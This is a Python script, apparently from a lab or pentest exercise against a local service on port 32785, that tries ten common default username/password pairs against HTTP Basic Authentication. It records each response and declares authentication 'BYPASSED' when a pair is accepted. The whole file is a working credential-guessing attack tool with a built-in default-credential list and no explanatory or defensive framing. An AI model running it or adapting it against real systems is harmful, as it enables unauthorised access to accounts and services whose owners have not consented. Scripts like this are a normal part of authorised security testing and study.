import requests
from requests.auth import HTTPBasicAuth
import time

target_url = "http://127.0.0.1:32785"

# Common credentials to test
credentials = [
    ("admin", "admin"),
    ("admin", "password"),
    ("admin", "password123"),
    ("user", "user"),
    ("user", "password"),
    ("test", "test"),
    ("test", "test123"),
    ("root", "root"),
    ("root", "password"),
    ("guest", "guest")
]

print(f"[*] Testing HTTP Basic Authentication on {target_url}")
print("=" * 60)

# First, test if the target is reachable
print("\n[*] Testing target connectivity...")
try:
    test_response = requests.get(target_url, timeout=10)
    print(f"[+] Target is reachable (Status: {test_response.status_code})")
except requests.exceptions.ConnectionError as e:
    print(f"[-] Connection error: {e}")
    print("[-] Target may not be running or port may be incorrect")
except requests.exceptions.Timeout:
    print("[-] Timeout - target not responding")
except Exception as e:
    print(f"[-] Unexpected error: {e}")

successful_credentials = []
failed_connections = 0

print(f"\n[*] Starting credential tests (10 attempts)...")
print("-" * 60)

for i, (username, password) in enumerate(credentials, 1):
    print(f"\n[{i}/10] Testing: {username}:{password}")
    
    try:
        response = requests.get(
            target_url, 
            auth=HTTPBasicAuth(username, password), 
            timeout=10,
            allow_redirects=False
        )
        
        print(f"    Status Code: {response.status_code}")
        
        if response.status_code == 200:
            print(f"    Result: ACCESS GRANTED ✓")
            successful_credentials.append((username, password))
            # Print first 500 chars of response to see what we accessed
            print(f"    Response preview: {response.text[:200]}...")
        elif response.status_code == 401:
            print(f"    Result: ACCESS DENIED ✗")
        elif response.status_code == 403:
            print(f"    Result: FORBIDDEN (403) - Auth passed but access denied")
            successful_credentials.append((username, password))
        elif response.status_code in [301, 302, 307, 308]:
            print(f"    Result: REDIRECT to {response.headers.get('Location', 'unknown')}")
        else:
            print(f"    Result: UNEXPECTED STATUS")
            print(f"    Response preview: {response.text[:200]}...")
        
        # Print response headers
        print(f"    Response headers: {dict(response.headers)}")
        
    except requests.exceptions.Timeout:
        print(f"    Result: TIMEOUT - Target not responding")
        failed_connections += 1
    except requests.exceptions.ConnectionError as e:
        print(f"    Result: CONNECTION ERROR - {str(e)[:100]}")
        failed_connections += 1
    except Exception as e:
        print(f"    Result: ERROR - {str(e)[:100]}")
        failed_connections += 1
    
    # Small delay between requests
    time.sleep(0.5)

# Final summary
print("\n" + "=" * 60)
print("[*] FINAL SUMMARY")
print("=" * 60)
print(f"\nTotal credentials tested: {len(credentials)}")
print(f"Successful authentications: {len(successful_credentials)}")
print(f"Failed connections: {failed_connections}")

if successful_credentials:
    print("\n[+] SUCCESSFUL BASIC AUTH CREDENTIALS:")
    for username, password in successful_credentials:
        print(f"    ✓ {username}:{password}")
    print(f"\n[*] RESULT: HTTP Basic Authentication BYPASSED ✓")
else:
    print("\n[-] No successful authentications found.")
    print(f"\n[*] RESULT: HTTP Basic Authentication NOT bypassed ✗")

print(f"\n[*] Test completed at {time.strftime('%H:%M:%S')}")
